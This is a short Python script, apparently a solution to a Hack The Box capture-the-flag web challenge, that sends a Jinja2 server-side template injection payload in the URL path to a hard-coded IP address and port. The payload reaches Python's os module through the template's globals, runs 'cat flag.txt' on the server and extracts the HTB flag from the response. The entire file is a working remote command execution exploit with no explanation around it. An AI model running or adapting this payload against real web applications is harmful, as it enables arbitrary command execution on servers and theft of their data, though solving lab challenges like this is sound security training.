import requests
import re

host, port = "94.237.60.55", 44433

url = f'http://{host}:{port}'

payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"

response = requests.get(f"{url}/{payload}")

flag = re.search(r'HTB\{.*?\}', response.text)

print(flag.group())